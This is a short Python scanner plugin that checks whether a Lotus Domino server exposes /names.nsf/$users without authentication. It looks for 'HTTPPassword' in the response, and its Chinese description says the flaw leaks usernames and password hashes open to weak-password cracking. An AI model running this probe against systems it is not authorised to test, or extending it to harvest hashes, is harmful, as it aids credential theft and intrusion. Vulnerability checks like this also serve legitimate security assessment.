#!/usr/bin/env python
# -*- coding: utf-8 -*- 
'''
name: domino_unauth未授权漏洞
referer: unknow
author: Lucifer
description: lotus-domino未授权访问，可以获得用户名和密码hash列表，可通过破解弱口令进入系统
'''
import sys
import requests
import warnings

  

class domino_unauth:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['domino_unauth未授权漏洞','','']
        payload = "/names.nsf/$users"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"HTTPPassword" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = domino_unauth(sys.argv[1])
    testVuln.run()
